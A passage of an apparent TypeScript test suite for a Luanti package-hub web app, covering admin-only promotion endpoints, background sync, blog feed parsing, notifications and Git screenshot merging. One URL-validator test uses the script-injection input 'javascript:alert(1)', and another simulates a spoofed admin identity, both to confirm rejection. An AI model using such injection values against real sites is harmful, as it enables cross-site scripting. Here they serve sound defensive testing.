    // 5. Verify /api/promotions URL normalizer and Admin CRUD handlers
    expect(normalizePromoUrl('promo.png', true)).toBe('/promo.png');
    expect(normalizePromoUrl('/banners/event.webp', true)).toBe('/banners/event.webp');
    expect(normalizePromoUrl('/submit', false)).toBe('/submit');
    expect(normalizePromoUrl('https://luanti.org/events', false)).toBe('https://luanti.org/events');
    expect(normalizePromoUrl('javascript:alert(1)', false)).toBeNull();

    const filteredActive = filterActivePromotions([activePromo, expiredPromo, futureScheduledPromo], nowMs);
    expect(filteredActive.length).toBe(1);
    expect(filteredActive[0].id).toBe('promo-jam-2026');

    // Non-admin GET, POST, and DELETE to /api/promotions must all return 403 Forbidden
    const nonAdminGetRes = await promotionsOnRequestGet({
      request: new Request('https://luantihub.org/api/promotions', { method: 'GET' }),
      env: {}
    });
    expect(nonAdminGetRes.status).toBe(403);

    const nonAdminPostRes = await promotionsOnRequestPost({
      request: new Request('https://luantihub.org/api/promotions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(activePromo)
      }),
      env: {}
    });
    expect(nonAdminPostRes.status).toBe(403);

    const nonAdminDeleteRes = await promotionsOnRequestDelete({
      request: new Request('https://luantihub.org/api/promotions?id=promo-jam-2026', {
        method: 'DELETE'
      }),
      env: {}
    });
    expect(nonAdminDeleteRes.status).toBe(403);

    // Unverified identity spoofing admin handle must also be rejected as non-admin
    (authService as any)._currentUser.set({
      id: 'spoof-1',
      username: 'sakel-hub',
      display_name: 'Spoofer',
      avatar_url: 'logo.svg',
      role: 'admin',
      is_admin: true,
      identities: [{ provider: 'contentdb', username: 'sakel-hub', verified: false }],
      packages: []
    });
    expect(authService.isAdmin()).toBe(false);
    drawerComp.activeTab.set('packages');
    drawerComp.onSelectPromotionsTab();
    expect(drawerComp.activeTab()).toBe('packages');
  });

  it('should register Periodic Background Sync, queue offline mutations for Background Sync, and update Home/Top 10 from Service Worker sync broadcasts', async () => {
    const pwaService = TestBed.inject(PwaService);
    const pkgService = TestBed.inject(PackageService);
    const settingsService = TestBed.inject(SettingsService);

    // 1. Verify Periodic Background Sync (`periodicsync`) registration when permission is granted
    const registeredPeriodicTags: Array<{ tag: string; options: any }> = [];
    const registeredOneOffTags: string[] = [];
    const mockSwRegistration: any = {
      active: {},
      showNotification: () => Promise.resolve(),
      periodicSync: {
        getTags: async () => registeredPeriodicTags.map(t => t.tag),
        register: async (tag: string, options: any) => {
          registeredPeriodicTags.push({ tag, options });
        }
      },
      sync: {
        register: async (tag: string) => {
          registeredOneOffTags.push(tag);
        }
      }
    };

    const origServiceWorker = navigator.serviceWorker;
    const origPermissions = (navigator as any).permissions;
    Object.defineProperty(navigator, 'serviceWorker', {
      configurable: true,
      value: {
        getRegistration: async () => mockSwRegistration,
        ready: Promise.resolve(mockSwRegistration)
      }
    });
    Object.defineProperty(navigator, 'permissions', {
      configurable: true,
      value: {
        query: async ({ name }: { name: string }) => ({
          state: name === 'periodic-background-sync' ? 'granted' : 'prompt'
        })
      }
    });

    try {
      const registered = await pwaService.initBackgroundAndPeriodicSync();
      expect(registered).toBe(true);
      expect(pwaService.periodicSyncRegistered()).toBe(true);
      expect(pwaService.backgroundSyncSupported()).toBe(true);
      expect(registeredPeriodicTags.length).toBe(1);
      expect(registeredPeriodicTags[0].tag).toBe(PERIODIC_SYNC_TAG);

      // 3. Verify One-Off Background Sync (`sync`) for catalog refresh and offline mutations
      const catalogSyncRequested = await pwaService.requestCatalogBackgroundSync();
      expect(catalogSyncRequested).toBe(true);
      expect(registeredOneOffTags).toContain(ONE_OFF_CATALOG_SYNC_TAG);

      // Queue an offline favorite mutation and verify it is stored in the outbox and registers 'lh-sync-outbox'
      localStorage.removeItem('lh_sync_outbox_fallback_v1');
      const queued = await pwaService.queueBackgroundMutation({
        id: 'fav:rubenwardy/crafting',
        url: '/api/auth/favorites',
        method: 'POST',
        body: { action: 'add', packageId: 'rubenwardy/crafting', clientId: settingsService.clientId() }
      });
      expect(queued).toBe(true);
      expect(registeredOneOffTags).toContain(ONE_OFF_OUTBOX_SYNC_TAG);

      const pendingBeforeFlush = await pwaService.getQueuedOutboxMutations();
      expect(pendingBeforeFlush.some(item => item.id === 'fav:rubenwardy/crafting')).toBe(true);

      // Flush the outbox when online and verify the queued POST is replayed and removed
      const flushedUrls: string[] = [];
      const origFetch = globalThis.fetch;
      globalThis.fetch = (async (input: RequestInfo | URL) => {
        flushedUrls.push(String(input));
        return new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }) as typeof fetch;

      try {
        const flushedCount = await pwaService.flushOutboxMutations();
        expect(flushedCount).toBeGreaterThanOrEqual(1);
        expect(flushedUrls).toContain('/api/auth/favorites');

        const pendingAfterFlush = await pwaService.getQueuedOutboxMutations();
        expect(pendingAfterFlush.some(item => item.id === 'fav:rubenwardy/crafting')).toBe(false);
      } finally {
        globalThis.fetch = origFetch;
      }

      // 4. Verify Service Worker `LH_BOOT_SYNC_UPDATED` broadcast updates Home Page tiles & Top 10 Today/Week
      const origSendDuringBroadcast = pwaService.sendNativeNotification.bind(pwaService);
      pwaService.sendNativeNotification = async () => true;
      try {
        (pwaService as any).notifyCatalogSyncListeners({
          source: 'sw-broadcast',
          ts: Date.now(),
          payload: {
            packages: [
              {
                id: 'Wuzzy/mineclone2',
                author: 'Wuzzy',
                name: 'mineclone2',
                title: 'VoxeLibre (Synced via SW)',
                type: 'game',
                short_desc: 'Updated in background via Periodic Sync',
                downloads: 950000,
                score: 4.9,
                source: 'official'
              }
            ],
            top10Today: [
              {
                id: 'Wuzzy/mineclone2',
                author: 'Wuzzy',
                name: 'mineclone2',
                title: 'VoxeLibre (Synced via SW)',
                type: 'game',
                short_desc: 'Updated in background via Periodic Sync',
                downloads: 950000,
                score: 4.9,
                source: 'official'
              }
            ]
          }
        });
      } finally {
        pwaService.sendNativeNotification = origSendDuringBroadcast;
      }

      expect(pkgService.packages().some(p => p.title === 'VoxeLibre (Synced via SW)')).toBe(true);
      expect(pkgService.top10TodayPackages()[0]?.title).toBe('VoxeLibre (Synced via SW)');
    } finally {
      Object.defineProperty(navigator, 'serviceWorker', {
        configurable: true,
        value: origServiceWorker
      });
      Object.defineProperty(navigator, 'permissions', {
        configurable: true,
        value: origPermissions
      });
    }
  });

  it('should parse blog.luanti.org RSS/JSON feeds, pin the latest Luanti Blog article in the Hero Slider right after active Admin Promotions, and notify once when a new article is published', async () => {
    const pkgService = TestBed.inject(PackageService);
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);

    // 1. Verify RSS 2.0 XML parser (`parseLuantiBlogFeed`) for https://blog.luanti.org/feed.rss
    const sampleRssXml = `<?xml version="1.0" encoding="UTF-8"?>
      <rss version="2.0">
        <channel>
          <title>Luanti Blog</title>
          <link>https://blog.luanti.org/</link>
          <item>
            <title>Luanti 5.17.0 &amp;ndash; Released!</title>
            <description>&lt;h2&gt;Highlights&lt;/h2&gt;&lt;p&gt;Luanti 5.17.0 brings early gamepad support, Android user data export, and faster rendering.&lt;/p&gt;</description>
            <pubDate>Fri, 21 Aug 2026 12:00:00 +0000</pubDate>
            <link>https://blog.luanti.org/2026/08/21/5.17.0-released/</link>
            <guid isPermaLink="true">https://blog.luanti.org/2026/08/21/5.17.0-released/</guid>
            <enclosure type="image/webp" url="https://blog.luanti.org/static/blog/5.17.0/cover.webp" />
          </item>
        </channel>
      </rss>`;

    const parsedRss = parseLuantiBlogFeed(sampleRssXml);
    expect(parsedRss).toBeTruthy();
    expect(parsedRss?.title).toBe('Luanti 5.17.0 – Released!');
    expect(parsedRss?.url).toBe('https://blog.luanti.org/2026/08/21/5.17.0-released/');
    expect(parsedRss?.image_url).toBe('https://blog.luanti.org/static/blog/5.17.0/cover.webp');
    expect(parsedRss?.summary).toContain('Luanti 5.17.0 brings early gamepad support');
    expect(parsedRss?.summary).not.toContain('<p>');

    // 2. Verify JSON Feed parser (`parseLuantiBlogFeed`) for https://blog.luanti.org/feed.json
    const sampleJsonFeed = JSON.stringify({
      version: 'https://jsonfeed.org/version/1.1',
      title: 'Luanti Blog',
      items: [
        {
          id: 'https://blog.luanti.org/2026/10/11/froscon-2026/',
          url: 'https://blog.luanti.org/2026/10/11/froscon-2026/',
          title: 'Luanti at FrOSCon 2026',
          content_html: '<img src="/static/blog/froscon2026/stand.jpg" /><p>Recap of our open-source booth in Sankt Augustin.</p>',
          date_published: '2026-10-11T10:00:00Z'
        }
      ]
    });

    const parsedJson = parseLuantiBlogFeed(sampleJsonFeed);
    expect(parsedJson?.title).toBe('Luanti at FrOSCon 2026');
    expect(parsedJson?.image_url).toBe('https://blog.luanti.org/static/blog/froscon2026/stand.jpg');
    expect(parsedJson?.summary).toContain('Recap of our open-source booth');

    // 3. Verify Hero Showcase slide ordering:
    // - Slide #1 by default when no Admin Promotion is active
    // - Slide #2 right after an active Admin Promotion when one is active
    const sixGames = Array.from({ length: 6 }, (_, i) =>
      (pkgService as any).normalizePackage({
        id: `author/blog_test_game_${i + 1}`,
        author: 'author',
        name: `blog_test_game_${i + 1}`,
        title: `Showcase Game ${i + 1}`,
        type: 'game',
        short_desc: `Organic showcase game #${i + 1}`,
        banner: `https://content.luanti.org/uploads/game_${i + 1}.png`,
        downloads: 1000 * (i + 1)
      })
    );
    (pkgService as any)._packages.set(sixGames);
    pkgService.setPromotions([]);
    pkgService.setLatestBlogPost(parsedRss!);

    const slidesNoPromo = pkgService.heroShowcasePackages();
    expect(slidesNoPromo.length).toBe(7); // 1 blog slide + 6 organic slides
    expect(slidesNoPromo[0].id).toContain('promo:blog:');
    expect(slidesNoPromo[0].title).toBe('Luanti 5.17.0 – Released!');
    expect(slidesNoPromo[0]._promo?.badge_text).toContain('LUANTI BLOG');
    expect(slidesNoPromo[0]._promo?.cta_label).toBe('Read Article');
    expect(slidesNoPromo[0]._promo?.cta_url).toBe('https://blog.luanti.org/2026/08/21/5.17.0-released/');

    // Add an active Admin Promotion -> Admin Promo is Slide #1 (index 0), Blog Post is Slide #2 (index 1)
    const nowMs = Date.now();
    pkgService.setPromotions([
      {
        id: 'promo-jam',
        title: 'Game Jam 2026',
        short_desc: 'Join the jam!',
        banner_url: '/promo.png',
        badge_text: 'EVENT',
        cta_label: 'Join Now',
        cta_url: '/submit',
        starts_at: new Date(nowMs - 3600_000).toISOString(),
        expires_at: new Date(nowMs + 86400_000).toISOString(),
        priority: 100
      }
    ]);

    const slidesWithPromo = pkgService.heroShowcasePackages();
    expect(slidesWithPromo.length).toBe(8); // 1 admin promo + 1 blog slide + 6 organic slides
    expect(slidesWithPromo[0].id).toBe('promo:promo-jam');
    expect(slidesWithPromo[1].id).toContain('promo:blog:');
    expect(slidesWithPromo[1].title).toBe('Luanti 5.17.0 – Released!');

    // 4. Verify PwaService.checkAndNotifyBlogPost() notifies once and deduplicates via lh_seen_blog_posts_v1
    localStorage.removeItem('lh_seen_blog_posts_v1');
    const blogNotifs: any[] = [];
    const origSendNotif = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      blogNotifs.push(payload);
      return true;
    };
    try {
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyPromotions.set(true);

      const notifiedFirst = pwaService.checkAndNotifyBlogPost(parsedRss!);
      expect(notifiedFirst).toBe(true);
      expect(blogNotifs.length).toBe(1);
      expect(blogNotifs[0].title).toBe('Luanti Blog · Luanti 5.17.0 – Released!');
      expect(blogNotifs[0].image).toBe('https://blog.luanti.org/static/blog/5.17.0/cover.webp');
      expect(blogNotifs[0].data?.ctaUrl).toBe('https://blog.luanti.org/2026/08/21/5.17.0-released/');

      // Second call for the same article is deduplicated
      const notifiedSecond = pwaService.checkAndNotifyBlogPost(parsedRss!);
      expect(notifiedSecond).toBe(false);
      expect(blogNotifs.length).toBe(1);
    } finally {
      pwaService.sendNativeNotification = origSendNotif;
      localStorage.removeItem('lh_seen_blog_posts_v1');
      pkgService.setLatestBlogPost(null);
      pkgService.setPromotions([]);
    }

    // 5. Verify sendNativeNotification resolves icons as data:image/png Data URLs across app_update, blog post, and broken/missing paths
    const swNotifCalls: Array<{ title: string; options?: NotificationOptions & { image?: string } }> = [];
    const origNotification = (window as any).Notification;
    const origSwDescriptor = Object.getOwnPropertyDescriptor(navigator, 'serviceWorker');
    const origFetch = globalThis.fetch;

    class MockNotif {
      static permission: NotificationPermission = 'granted';
      onclick: (() => void) | null = null;
      constructor(public title: string, public options?: NotificationOptions) {
        swNotifCalls.push({ title, options });
      }
      close(): void {}
    }
    (window as any).Notification = MockNotif;

    const onePixelPngBytes = new Uint8Array([
      137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82,
      0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 31, 21, 196, 137, 0,
      0, 0, 13, 73, 68, 65, 84, 120, 156, 99, 248, 255, 255, 63,
      0, 5, 254, 2, 254, 167, 53, 129, 132, 0, 0, 0, 0, 73, 69,
      78, 68, 174, 66, 96, 130
    ]);

    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = String(input);
      if (url.includes('/promo.png')) {
        return new Response('Not Found', { status: 404 });
      }
      if (
        url.includes('/icons/notif-') ||
        url.includes('/icons/icon-72x72.png') ||
        url.includes('blog.luanti.org/static/') ||
        url.includes('/screenshot-desktop.png')
      ) {
        return new Response(onePixelPngBytes, {
          status: 200,
          headers: { 'Content-Type': 'image/png' }
        });
      }
      return new Response('', { status: 404 });
    }) as typeof fetch;

    Object.defineProperty(navigator, 'serviceWorker', {
      configurable: true,
      value: {
        getRegistration: async () => ({
          active: { state: 'activated' },
          showNotification: async (title: string, options?: NotificationOptions) => {
            swNotifCalls.push({ title, options });
          }
        })
      }
    });

    try {
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyAppUpdates.set(true);
      settingsService.notifyPromotions.set(true);
      (pwaService as any).localAssetDataUrlCache.clear();

      // A: App Update notification resolves /icons/notif-app-update.png into a data:image/png Data URL for both icon and image
      const appUpdateSent = await pwaService.sendNativeNotification({
        title: 'LuantiHub Update Available',
        body: 'Click to reload.',
        tag: 'lh-test-app-update-icon-dataurl',
        category: 'app_update',
        variant: 'app_update'
      });
      expect(appUpdateSent).toBe(true);
      expect(swNotifCalls[0].options?.icon?.startsWith('data:image/png')).toBe(true);
      expect(swNotifCalls[0].options?.image?.startsWith('data:image/png')).toBe(true);
      expect(swNotifCalls[0].options?.badge?.startsWith('data:image/png')).toBe(true);

      // B: Blog post notification with external blog.luanti.org image resolves to data:image/png
      const blogSent = await pwaService.sendNativeNotification({
        title: 'Luanti Blog · Security Incident Update',
        body: 'Official blog post',
        icon: 'https://blog.luanti.org/static/blog/2026_cdb_incident/cover.webp',
        image: 'https://blog.luanti.org/static/blog/2026_cdb_incident/cover.webp',
        tag: 'lh-test-blog-icon-dataurl',
        category: 'promotion',
        variant: 'promotion'
      });
      expect(blogSent).toBe(true);
      expect(swNotifCalls[1].options?.icon?.startsWith('data:image/png')).toBe(true);
      expect(swNotifCalls[1].options?.image?.startsWith('data:image/png')).toBe(true);

      // C: Promotion with broken /promo.png path falls back to /icons/notif-new-package.png Data URL instead of 404 URL
      const fallbackPromoSent = await pwaService.sendNativeNotification({
        title: 'PROMOTED · Event',
        body: 'Event details',
        icon: '/promo.png',
        image: '/promo.png',
        tag: 'lh-test-promo-broken-fallback',
        category: 'promotion',
        variant: 'promotion'
      });
      expect(fallbackPromoSent).toBe(true);
      expect(swNotifCalls[2].options?.icon?.startsWith('data:image/png')).toBe(true);
      expect(swNotifCalls[2].options?.icon).not.toContain('/promo.png');
    } finally {
      globalThis.fetch = origFetch;
      (window as any).Notification = origNotification;
      if (origSwDescriptor) {
        Object.defineProperty(navigator, 'serviceWorker', origSwDescriptor);
      }
    }

    // 6. Verify PwaService.checkAndNotifyNewReviews() baseline seeding, star formatting, self-review exclusion, and deduplication
    localStorage.removeItem('lh_seen_reviews_v1');
    const reviewNotifs: any[] = [];
    const origSendReviewNotif = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      reviewNotifs.push(payload);
      return true;
    };
    try {
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyNewReviews.set(true);

      const recentIso = new Date().toISOString();
      // First load with isBaselineSeedAllowed: true seeds existing reviews silently without firing notifications
      const seededCount = pwaService.checkAndNotifyNewReviews(
        [
          {
            id: 101,
            package_id: 'wuzzy/mineclonia',
            package_title: 'Mineclonia',
            rating: 5,
            comment: 'Baseline review',
            created_at: recentIso,
            reviewer_username: 'alice'
          }
        ],
        { isBaselineSeedAllowed: true }
      );
      expect(seededCount).toBe(0);
      expect(reviewNotifs.length).toBe(0);

      // Marking own submitted review as seen prevents future notifications
      pwaService.markReviewSeen('lh_102');

      // Subsequent check with a brand-new review (103), own review (104), and already-seen (101, 102)
      const notifiedCount = pwaService.checkAndNotifyNewReviews(
        [
          {
            id: 101,
            package_id: 'wuzzy/mineclonia',
            package_title: 'Mineclonia',
            rating: 5,
            comment: 'Baseline review',
            created_at: recentIso,
            reviewer_username: 'alice'
          },
          {
            id: 102,
            package_id: 'wuzzy/mineclonia',
            package_title: 'Mineclonia',
            rating: 4,
            comment: 'Already marked seen via markReviewSeen',
            created_at: recentIso,
            reviewer_username: 'bob'
          },
          {
            id: 103,
            package_id: 'rubenwardy/crafting',
            package_title: 'Crafting Guide',
            package_thumbnail: 'https://raw.githubusercontent.com/rubenwardy/crafting/main/screenshot.png',
            rating: 4,
            comment: 'Super intuitive crafting UI!',
            created_at: recentIso,
            reviewer_username: 'charlie'
          },
          {
            id: 104,
            package_id: 'rubenwardy/crafting',
            package_title: 'Crafting Guide',
            rating: 5,
            comment: 'My own review',
            created_at: recentIso,
            reviewer_username: 'current_viewer'
          }
        ],
        {
          isBaselineSeedAllowed: true,
          excludeAuthorUsername: 'current_viewer'
        }
      );

      expect(notifiedCount).toBe(1);
      expect(reviewNotifs.length).toBe(1);
      expect(reviewNotifs[0].title).toBe('New Review · ★★★★☆ Crafting Guide');
      expect(reviewNotifs[0].body).toBe('by @charlie — "Super intuitive crafting UI!"');
      expect(reviewNotifs[0].category).toBe('new_review');
      expect(reviewNotifs[0].variant).toBe('new_review');
      expect(reviewNotifs[0].data?.packageId).toBe('rubenwardy/crafting');
      expect(pwaService.getNotificationVariantIconPath(reviewNotifs[0])).toBe('/icons/notif-new-package.png');
    } finally {
      pwaService.sendNativeNotification = origSendReviewNotif;
      localStorage.removeItem('lh_seen_reviews_v1');
    }
  });

  it('should resolve .cdb.json video_url (including Bitbucket /src/master/ branch hints and hover ?lite=1 hydration) and deliver PWA notifications immediately when minimized or in background', async () => {
    const {
      parseCdbJsonMetadata,
      extractGitBranchHint,
      scanGitRepoMetadataCached
    } = await import('../../functions/api/lib/upstream');
    const pkgService = TestBed.inject(PackageService);
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);

    // 1. Verify UTF-8 BOM tolerance and video_url extraction in parseCdbJsonMetadata
    const bomCdbRaw =
      '\uFEFF{"type":"MOD","title":"Everness","name":"everness","short_description":"Adds many new biomes, items and blocks.","video_url":"https://www.youtube.com/watch?v=9bZkp7q19f0"}';
    const parsedCdb = parseCdbJsonMetadata(bomCdbRaw);
    expect(parsedCdb?.title).toBe('Everness');
    expect(parsedCdb?.video_url).toBe('https://www.youtube.com/watch?v=9bZkp7q19f0');

    // 2. Verify branch-aware Bitbucket /src/master/ extraction and .cdb.json scanning
    const branchHint = extractGitBranchHint('https://bitbucket.org/minetest_gamers/everness/src/master/');
    expect(branchHint).toBe('master');

    const origFetch = globalThis.fetch;
    const requestedUrls: string[] = [];
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      requestedUrls.push(url);
      if (url === 'https://bitbucket.org/minetest_gamers/everness/raw/master/.cdb.json') {
        return new Response(bomCdbRaw, { status: 200, headers: { 'Content-Type': 'application/json' } });
      }
      if (url.includes('/api/packages/SaKeL/everness/?lite=1')) {
        return new Response(
          JSON.stringify({
            author: 'SaKeL',
            name: 'everness',
            title: 'Everness',
            type: 'mod',
            short_desc: 'Adds many new biomes, items and blocks.',
            repo_url: 'https://bitbucket.org/minetest_gamers/everness/src/master/',
            video_url: 'https://www.youtube.com/embed/9bZkp7q19f0',
            video_thumbnail_url: 'https://i.ytimg.com/vi/9bZkp7q19f0/hqdefault.jpg'
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('Not found', { status: 404 });
    });

    try {
      const scanned = await scanGitRepoMetadataCached(
        'SaKeL',
        'everness',
        'mod',
        'https://bitbucket.org/minetest_gamers/everness/src/master/'
      );
      expect(scanned?.cdbMeta?.video_url).toBe('https://www.youtube.com/watch?v=9bZkp7q19f0');
      expect(requestedUrls).toContain('https://bitbucket.org/minetest_gamers/everness/raw/master/.cdb.json');

      // 3. Verify tile hover (!deepFetch) calls ?lite=1 when video_url is missing and hydrates video_url + video_thumbnail_url
      const baseEverness = (pkgService as any).normalizePackage({
        id: 'SaKeL/everness',
        author: 'SaKeL',
        name: 'everness',
        title: 'Everness',
        type: 'mod',
        short_desc: 'Adds many new biomes, items and blocks.',
        repo_url: 'https://bitbucket.org/minetest_gamers/everness/src/master/',
        screenshots: ['https://content.luanti.org/uploads/everness1.png']
      });
      (pkgService as any)._packages.set([baseEverness]);
      await pkgService.loadPackageDetails(baseEverness, false);

      const hydratedEverness = pkgService.packages().find(p => p.id === 'SaKeL/everness');
      expect(hydratedEverness?.video_url).toContain('9bZkp7q19f0');
      expect(hydratedEverness?.video_thumbnail_url).toBe('https://i.ytimg.com/vi/9bZkp7q19f0/hqdefault.jpg');
    } finally {
      globalThis.fetch = origFetch;
    }

    // 4. Verify PWA notifications fire immediately when window is minimized/hidden (document.visibilityState === 'hidden')
    const origVisDescriptor = Object.getOwnPropertyDescriptor(document, 'visibilityState');
    const origNotification = (window as any).Notification;
    const origSwDescriptor = Object.getOwnPropertyDescriptor(navigator, 'serviceWorker');
    const swNotifCalls: Array<{ title: string; options?: NotificationOptions }> = [];

    Object.defineProperty(document, 'visibilityState', {
      configurable: true,
      get: () => 'hidden'
    });
    (window as any).Notification = { permission: 'granted' };
    Object.defineProperty(navigator, 'serviceWorker', {
      configurable: true,
      value: {
        getRegistration: async () => ({
          active: { state: 'activated', postMessage: vi.fn() },
          showNotification: async (title: string, options?: NotificationOptions) => {
            swNotifCalls.push({ title, options });
          }
        })
      }
    });

    try {
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyPackageUpdates.set(true);
      pwaService.notificationPermission.set('granted');

      const sentHidden = await pwaService.sendNativeNotification({
        title: 'Package Updated · [MOD] Everness',
        body: 'by SaKeL — Mineral Waters Update',
        icon: 'https://content.luanti.org/uploads/everness1.png',
        tag: 'lh-test-hidden-everness-update',
        category: 'package_update',
        variant: 'package_update',
        data: { packageId: 'SaKeL/everness' }
      });
      expect(sentHidden).toBe(true);
      expect(swNotifCalls.length).toBe(1);
      expect(swNotifCalls[0].title).toBe('Package Updated · [MOD] Everness');

      // Verify click routing deduplication (500ms guard prevents double-navigation when both SW and client handle click)
      const clickedPayloads: any[] = [];
      pwaService.registerNotificationClickHandler((data: any) => {
        clickedPayloads.push(data);
      });
      (pwaService as any).handleNotificationAction({ packageId: 'SaKeL/everness' });
      (pwaService as any).handleNotificationAction({ packageId: 'SaKeL/everness' });
      expect(clickedPayloads.length).toBe(1);
      expect(clickedPayloads[0].packageId).toBe('SaKeL/everness');
    } finally {
      if (origVisDescriptor) {
        Object.defineProperty(document, 'visibilityState', origVisDescriptor);
      } else {
        delete (document as any).visibilityState;
      }
      (window as any).Notification = origNotification;
      if (origSwDescriptor) {
        Object.defineProperty(navigator, 'serviceWorker', origSwDescriptor);
      }
    }
  });

  it('should prefer and store Git repository screenshot.png in D1 and merge ContentDB gallery screenshots in Package Details', async () => {
    const {
      isGitRepositoryAssetUrl,
      mergeScreenshotsPreferringGit,
      scanGitRepoMetadataCached
    } = await import('../../functions/api/lib/upstream');
    const { onRequestGet: onPkgDetailGet } = await import('../../functions/api/packages/[author]/[name]/index');
    const pkgService = TestBed.inject(PackageService);

    const gitShot = 'https://bitbucket.org/minetest_gamers/everness/raw/master/screenshot.png';
    const cdbThumb = 'https://content.luanti.org/thumbnails/1/everness.png';
    const cdbShot1 = 'https://content.luanti.org/uploads/everness_shot_1.png';
    const cdbShot2 = 'https://content.luanti.org/uploads/everness_shot_2.png';

    // 1. Verify isGitRepositoryAssetUrl and mergeScreenshotsPreferringGit
    expect(isGitRepositoryAssetUrl(gitShot)).toBe(true);
    expect(isGitRepositoryAssetUrl(cdbThumb)).toBe(false);
    expect(isGitRepositoryAssetUrl(cdbShot1)).toBe(false);

    const mergedList = mergeScreenshotsPreferringGit(
      [gitShot, cdbThumb],
      [cdbShot1, { url: cdbShot2 }, gitShot]
    );
    expect(mergedList).toEqual([gitShot, cdbShot1, cdbShot2]);

    // 2. Verify scanGitRepoMetadataCached discovers screenshot.png in Git repository
    const origFetch = globalThis.fetch;
    const savedRows: any[] = [];
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url === 'https://bitbucket.org/minetest_gamers/everness/raw/master/mod.conf') {
        return new Response('name = everness\ntitle = Everness\ndescription = Biomes and blocks\nlicense = LGPL-2.1-only\n', {
          status: 200
        });
      }
      if (url === gitShot) {
        return new Response('', { status: 200, headers: { 'Content-Type': 'image/png' } });
      }
      if (url.includes('/api/packages/SaKeL/everness/')) {
        return new Response(
          JSON.stringify({
            author: 'SaKeL',
            name: 'everness',
            title: 'Everness',
            type: 'mod',
            short_description: 'Biomes and blocks',
            long_description: 'Full Everness long description from ContentDB.',
            license: 'LGPL-2.1-only',
            media_license: 'CC-BY-SA-4.0',
            repo: 'https://bitbucket.org/minetest_gamers/everness/src/master/',
            thumbnail: cdbThumb,
            screenshots: [{ url: cdbShot1 }, { url: cdbShot2 }],
            downloads: 42000
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('Not found', { status: 404 });
    });

    try {
      const scanRes = await scanGitRepoMetadataCached(
        'SaKeL',
        'everness',
        'mod',
        'https://bitbucket.org/minetest_gamers/everness/src/master/',
        0
      );
      expect(scanRes.gitRepoStatus).toBe('verified');
      expect(scanRes.screenshotUrl).toBe(gitShot);
      expect(scanRes.screenshots).toEqual([gitShot]);

      // 3. Verify /api/packages/[author]/[name] prefers Git screenshot.png, merges ContentDB screenshots, and stores in D1
      const mockDb = {
        prepare: (sql: string) => ({
          bind: (...args: any[]) => ({
            first: async () => {
              if (sql.includes('FROM packages')) {
                return {
                  id: 'SaKeL/everness',
                  author_name: 'SaKeL',
                  name: 'everness',
                  title: 'Everness',
                  type: 'mod',
                  provider: 'bitbucket',
                  repo_url: 'https://bitbucket.org/minetest_gamers/everness/src/master/',
                  thumbnail_url: gitShot,
                  banner_url: gitShot,
                  screenshots: null,
                  license: 'LGPL-2.1-only',
                  media_license: 'CC-BY-SA-4.0',
                  tags: JSON.stringify(['mod', 'git', 'contentdb']),
                  status: 'active'
                };
              }
              return null;
            },
            all: async () => ({ results: [] }),
            run: async () => {
              if (sql.includes('INSERT INTO packages') || sql.includes('UPDATE packages')) {
                savedRows.push({ sql, args });
              }
              return { success: true };
            }
          })
        })
      };

      const res = await onPkgDetailGet({
        params: { author: 'SaKeL', name: 'everness' },
        request: new Request('https://luantihub.org/api/packages/SaKeL/everness/?nocache=1'),
        env: { DB: mockDb }
      });
      expect(res.status).toBe(200);
      const detailBody = await res.json();
      expect(detailBody.banner).toBe(gitShot);
      expect(detailBody.thumbnail).toBe(cdbThumb);
      expect(detailBody.screenshots).toEqual([gitShot, cdbShot1, cdbShot2]);
      expect(savedRows.length).toBeGreaterThan(0);

      // 4. Verify PackageService.mergeDualSourcePackage and PackageDetailModalComponent preserve Git screenshot.png + merged gallery + distinct fallback thumbnail
      const cdbEntry = (pkgService as any).normalizePackage({
        id: 'SaKeL/everness',
        author: 'SaKeL',
        name: 'everness',
        title: 'Everness',
        type: 'mod',
        source: 'official',
        sources: ['official'],
        thumbnail: cdbThumb,
        screenshots: [cdbShot1, cdbShot2]
      });
      const gitEntry = (pkgService as any).normalizePackage({
        id: 'SaKeL/everness',
        author: 'SaKeL',
        name: 'everness',
        title: 'Everness',
        type: 'mod',
        source: 'git',
        sources: ['git'],
        thumbnail: gitShot,
        banner: gitShot,
        screenshots: [gitShot]
      });

      const dualMerged = pkgService.mergeDualSourcePackage(cdbEntry, gitEntry);
      expect(dualMerged.banner).toBe(gitShot);
      expect(dualMerged.thumbnail).toBe(cdbThumb);
      expect(dualMerged.screenshots).toEqual([gitShot, cdbShot1, cdbShot2]);

      const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
      modalFixture.componentInstance.package = dualMerged;
      (pkgService as any)._activePackage.set(dualMerged);
      modalFixture.detectChanges();

      expect(modalFixture.componentInstance.bannerImage).toBe(gitShot);
      expect(modalFixture.componentInstance.activeScreenshots()).toEqual([gitShot, cdbShot1, cdbShot2]);
      expect(modalFixture.componentInstance.mediaSlides().map(s => s.url)).toEqual([
        gitShot,
        cdbShot1,
        cdbShot2
      ]);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should enforce single-source-of-truth Git provider config (Bitbucket excluded from auth login, included for Git repo discovery & tile hydration)', async () => {
    const {
      ALL_GIT_PROVIDER_IDS,
      AUTH_LOGIN_GIT_PROVIDER_IDS,
      isGitProviderId,
      isAuthLoginGitProvider,
